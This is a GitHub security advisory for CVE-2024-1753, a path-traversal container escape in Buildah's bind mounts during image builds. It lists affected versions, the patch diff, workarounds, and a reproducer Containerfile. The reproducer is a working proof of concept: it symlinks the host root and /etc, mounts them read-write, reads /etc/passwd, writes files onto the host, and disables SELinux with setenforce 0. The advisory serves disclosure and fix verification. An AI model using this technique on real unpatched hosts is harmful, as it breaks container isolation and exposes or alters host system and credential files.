# [H] Container escape at build time

## Summary
Severity: High
Advisory: GHSA-pmf3-c36m-g5cf
CWE: CWE-22
Ecosystem: Go
Published: 2024-03-19
Source: https://github.com/advisories/GHSA-pmf3-c36m-g5cf
Type: github-advisory

## Affected
- Go: `github.com/containers/buildah` — affected >=1.35.0 <1.35.1
- Go: `github.com/containers/buildah` — affected >=1.34.0 <1.34.3
- Go: `github.com/containers/buildah` — affected >=1.33.0 <1.33.7
- Go: `github.com/containers/buildah` — affected >=1.25.0 <1.27.4
- Go: `github.com/containers/buildah` — affected >=1.24.0 <1.24.7
- Go: `github.com/containers/buildah` — affected >=1.28.0 <1.29.3
- Go: `github.com/containers/buildah` — affected >=1.30.0 <1.31.5
- Go: `github.com/containers/buildah` — affected >=1.32.0 <1.32.3

## Details
### Impact
_What kind of vulnerability is it? Who is impacted?_

Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.

### Patches
From @nalind 
```
# cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
 	"errors"
 
+	"github.com/containers/buildah/copier"
 	"github.com/containers/buildah/define"
 	"github.com/containers/buildah/internal"
 	internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
 	// buildkit parity: support absolute path for sources from current build context
 	if contextDir != "" {
 		// path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
 	} else {
 		// looks like its coming from `build run --mount=type=bind` allow using absolute path
 		// error out if no source is set
```
### Reproducer

Prior to testing, as root, add a memorable username to `/etc/passwd` via adduser or your favorite editor.   Also create a memorably named file in `/`.  Suggest: `touch /SHOULDNTSEETHIS.txt` and `adduser SHOULDNTSEETHIS`.  After testing, remember to remove both the file and the user from your system.

Use the following Containerfile

```
# cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
```

#### To Test

##### Testing with an older version of Buildah with the issue
```
setenforce 0
buildah build -f ~/cve_Containerfile .
```

As part of the printout from the build, you should be able to see the contents of the `/' and `/etc` directories, including the `/SHOULDNOTSEETHIS.txt` file that you created, and the contents of the `/etc/passwd` file which will include the `SHOULDNOTSEETHIS` user that you created.  In addition, the file `/BIND_BREAKOUT` and `/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  

```
buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
```
Neither the `/BIND_BREAKEOUT` or `/etc/BIND_BREAKOUT2` files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the `/etc/passwd` file, and nothing will be displayed from that file.  

However, the files in both the `/` and `/etc` directories on the host system will be displayed.

##### Testing with the patch

Use the same commands as testing with an older version of Buildah.

When running using the patched version of Buildah, regardless of the `setenforce` settings,  you should not see the file that you created or the user that you added.  Also the `/BIND_BREAKOUT` and the `/etc/BIND_BREAKOUT` will not exist on the host after the test completes.

NOTE: With the fix, the contents of the `/` and `/etc` directories, and the `/etc/passwd` file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the `/BIND_BREAKOUT` and `/etc/BIND_BREAKOUT` files will be created in the container image.


### Workarounds
Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the `/` directory can be displayed.  I.e., `ls -alF /` will show the contents of the host directory.

### References

Unknown.

## References
- https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf
- https://nvd.nist.gov/vuln/detail/CVE-2024-1753
- https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087
- https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5
- https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8
- https://bugzilla.redhat.com/show_bug.cgi?id=2265513
- https://github.com/containers/buildah
